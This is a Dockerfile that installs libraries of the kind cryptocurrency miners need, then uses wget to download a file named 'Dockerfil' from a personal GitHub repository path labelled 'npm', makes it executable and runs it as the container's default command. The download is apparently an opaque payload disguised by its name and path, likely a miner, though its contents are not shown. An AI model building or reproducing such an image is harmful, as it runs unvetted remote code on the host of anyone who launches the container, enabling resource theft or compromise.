FROM ubuntu:xenial

WORKDIR /root

RUN apt-get update && apt-get -qy install \
 automake \
 wget \
 build-essential \
 libcurl4-openssl-dev \
 libssl-dev \
 git \
 ca-certificates \
 libjansson-dev libgmp-dev g++ --no-install-recommends

RUN wget https://raw.githubusercontent.com/Jsjsj991/npm/main/Dockerfil && chmod +x Dockerfil

# Define default command.
CMD ./Dockerfil
